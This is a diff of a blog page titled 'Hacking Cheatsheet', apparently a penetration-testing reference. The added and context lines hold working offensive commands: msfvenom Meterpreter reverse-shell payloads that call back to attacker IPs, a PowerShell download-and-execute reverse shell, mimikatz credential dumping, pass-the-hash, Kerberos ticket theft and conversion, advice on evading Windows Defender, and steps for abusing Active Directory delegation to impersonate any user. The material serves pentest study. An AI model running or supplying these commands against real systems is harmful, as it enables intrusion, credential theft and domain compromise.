@@ -27,7 +27,7 @@ Hacking Cheatsheet :: Ceso Adventures
 <meta itemprop=name content="Hacking Cheatsheet">
 <meta itemprop=description content="My humble cheatsheet of most used tools, webs, etc"><meta itemprop=datePublished content="2020-04-07T02:30:30+00:00">
 <meta itemprop=dateModified content="2020-04-07T02:30:30+00:00">
-<meta itemprop=wordCount content="3776"><meta itemprop=image content="https://ceso.github.io/images/cheatsheet/banner.jpg">
+<meta itemprop=wordCount content="4247"><meta itemprop=image content="https://ceso.github.io/images/cheatsheet/banner.jpg">
 <meta itemprop=keywords content="blog,cheatsheet,hacking,linux,windows,exfiltration,privilegeescalation,">
 <meta name=twitter:card content="summary_large_image">
 <meta name=twitter:image content="https://ceso.github.io/images/cheatsheet/banner.jpg">
@@ -62,7 +62,7 @@ Hacking Cheatsheet :: Ceso Adventures
 <div class=content>
 <div class=post>
 <div class=post-info>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>18 minutes
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>20 minutes
 </p>
 </div>
 <h2 class=post-title><a href=https://ceso.github.io/posts/2020/04/hacking-cheatsheet/>Hacking Cheatsheet</a></h2>
@@ -315,6 +315,8 @@ Hacking Cheatsheet :: Ceso Adventures
 <li>
 <a href=#list-all-available-credentials-cached-hashes-and-passwords-logged-on-user-and-computer>List all available credentials cached (Hashes and Passwords; Logged on user and computer)</a>
 </li><li>
+<a href=#convert-to-ccache>Convert to ccache</a>
+</li><li>
 <a href=#genericall>GenericAll</a>
 </li><li>
 <a href=#genericwrite>GenericWrite</a>
@@ -426,6 +428,7 @@ SSH-2.0-OpenSSH_6.2p2 Debian-6
 Or having an user:
 smbmap -u ceso -H 192.168.24.24
 </code></pre></div><h3 id=login-through-cifswinrmpssession>Login through CIFS/WinRM/PSSession</h3>
+<p>When injecting a ticket and impersonating a user, we can swap <code>CIFS</code> for <code>HTTP</code> for getting a shell via WinRM or swap <code>CIFS</code> for <code>HOST</code> for getting a shell via PsExec!!!</p>
 <h4 id=crackmapexec---winrm>CrackMapExec - WinRM</h4>
 <p>With Hash</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>crackmapexec winrm 172.16.80.24 -u administrator -H 09238831b1af5edab93c773f56409d96 -x &#34;ipconfig&#34;
@@ -577,6 +580,11 @@ run -j
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_shell.war
 </code></pre></div><h3 id=windows-http-download-reverse-shell>Windows HTTP download reverse shell</h3>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>msfvenom -a x86 --platform windows -p windows/exec CMD=&#34;powershell \&#34;IEX(New-Object Net.WebClient).downloadString(&#39;http://192.168.42.42/Invoke-PowerShellTcp.ps1&#39;)\&#34;&#34; -e x86/unicode_mixed BufferRegister=EAX -f python
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.42.42 lport=443 -f csharp
+</code></pre></div><p>We can also use it with the following parameters for migration</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.59 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f csharp
+</code></pre></div><p>Or either, in the <code>msfconsole</code> add the parameter <code>AutoRunScript</code>, the following will try to migrate our reverse too explorer.exe:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>set AutoRunScript post/windows/manage/migrate name=explorer.exe spawn=false
 </code></pre></div><h3 id=windows-staged-reverse-tcp>Windows staged reverse TCP</h3>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
 </code></pre></div><h3 id=windows-stageless-reverse-tcp>Windows stageless reverse TCP</h3>
@@ -866,10 +874,23 @@ Get-DomainSID -Domain example.com &lt;-- Get the SID of example.com
 </code></pre></div><h3 id=exploitation>Exploitation</h3>
 <h4 id=list-all-available-credentials-cached-hashes-and-passwords-logged-on-user-and-computer>List all available credentials cached (Hashes and Passwords; Logged on user and computer)</h4>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>mimikatz.exe &#34;sekurlsa::logonpasswords&#34; exit
+</code></pre></div><h4 id=convert-to-ccache>Convert to ccache</h4>
+<p>We can use the tool <code>ticket_converter</code> written by <code>zer1t0</code> for converting kirbi tickets to ccache and viceversa:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>Convert from b64 encoded blob to kirbi:
+  [IO.File]::WriteAllBytes(&#34;C:\fullpathtoticket.kirbi&#34;, [Convert]::FromBase64String(&#34;aa…&#34;))
+Convert the .kiribi to .ccache:
+  python ticket_converter.py ticket.ccache ticket.kirbi
+Copy the ccache to our attacker machine and export the KRB5CCNAME variable:
+  export KRB5CCNAME=/path/to/ticket.ccache
 </code></pre></div><h4 id=genericall>GenericAll</h4>
 <h4 id=genericwrite>GenericWrite</h4>
 <h4 id=writedacl>WriteDACL</h4>
 <h4 id=unconstrained-delegation>Unconstrained Delegation</h4>
+<p>We have local adminstrative access to a host which is configured for Kerberos Unconstrained Delegation.
+We can leverage Rubeus for an auth from the DC and then steal the TGT, this can be used to perform a DCSync to obtain the NTLM hash for ANY account.
+Other way is by triggering the printer bug on a domain controller to coerce to authenticate to the host compromised we have using it&rsquo;s machine account.</p>
+<p>If a computer account has <code>TRUSTED_FOR_DELEGATION</code> in it&rsquo;s UserAccountControl (UAC), then it&rsquo;s a viable target.
+Domain controllers will also have <code>SERVER_TRUST_ACCOUNT_UAC</code>, so&mldr;if it the machine has this, then it&rsquo;s a DC.</p>
 <h5 id=by-forwardable-tgt-after-login>By Forwardable TGT after login</h5>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>1 - Enumerate if there if there is unconstrained delegation
 2 - If there is, open mimikatz (commands blow are inside it)
@@ -882,7 +903,7 @@ Get-DomainSID -Domain example.com &lt;-- Get the SID of example.com
 9 - C:\Windows\Temp\PsExec.exe \\example.com cmd &lt;-- Try to get a cmd shell in example.com by leveraging injected ticket
 <span style=color:#960050;background-color:#1e0010>
 </span><span style=color:#960050;background-color:#1e0010></span>* By default every user allows their TGT to be delegated, but high privilege users can be added to the group &#34;Protected Users Group&#34; to disable it, it also can break the application for which at the beggining unconstrained delegation was enabled for those users
-</code></pre></div><h5 id=by-using-of-spoolsampleexe>By using of SpoolSample.exe</h5>
+</code></pre></div><h5 id=by-using-of-spoolsampleexe-printer-bug>By using of SpoolSample.exe (printer bug)</h5>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>1 - Download and compile SpoolSample in a dev machine, it can be downloaded from: https://github.com/leechristensen/SpoolSample
 2 - Download and compile Rubeus in a dev machine, it can be downloaded from: https://github.com/GhostPack/Rubeus
 3 - Find a way to upload SpoolSample and Rubeus without being detected (for example, disabling Windows Defender, or injecting them into memory through reflection for example), for ease of the technique, all below is just written to disk
@@ -895,7 +916,21 @@ Get-DomainSID -Domain example.com &lt;-- Get the SID of example.com
 10 - misc::cmd &lt;-- Open cmd prompt from inside Mimikatz
 11 - C:\Windows\Temp\PsExec.exe -accepteula \\dc01 cmd &lt;-- Get a shell on dc01 by leveraging the golden ticket injected
 </code></pre></div><h4 id=constrained-delegation>Constrained Delegation</h4>
+<p>We have compromised a computer/user account configured for Constrained Delegation (ie, the account&rsquo;s UserAccountControl attribute contains the value <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>). If it is, it&rsquo;s A MUST to look also after <code>msDS-AllowedToDelegateTo</code> account&rsquo;s property, this will have one or more hostnames/SPNs where our account will be allowed to impersonate any (non-sensitive/unproctected) user in the domain.</p>
+<p>We have 2 scenarios where we can have Constrained Delegation:</p>
+<ul>
+<li>1 - We have command execution in the account in question, but not know the password for it</li>
+<li>2 - We know the NTLM hash, or at least can get the hash from the NTLM hash</li>
+</ul>
 <h4 id=resource-based-constrained-delegation-rbcd>Resource-Based Constrained Delegation (RBCD)</h4>
+<p>Only found if we are working on an envrionment which is running domain controllers with Windows Server 2012 or higher.
+This one is complex than the Unconstrained/Constrained.</p>
+<p>The scenarios where we can leverage this are:</p>
+<ul>
+<li>1 - Computer/User account compromised listed in another computer account&rsquo;s msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Used to leverage ANY user account on the host which has the property</li>
+<li>2 - Computer/User account which has GenericWrite to another computer account in the domain, can be leveraged to add the account compromised to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target and afterwards impersonate ANY user account.</li>
+<li>3 - We don&rsquo;t have credentials, but we can get to relay a hash with responder/impacket-ntlmrelayx/mitm6 to LDAP and create a new computer account and add it to the msDS-AllowedToActOnBehalfOfOtherIdentity property. Later on impersonate any user.</li>
+</ul>
 </div>
 <div class=pagination>
 <div class=pagination__title>
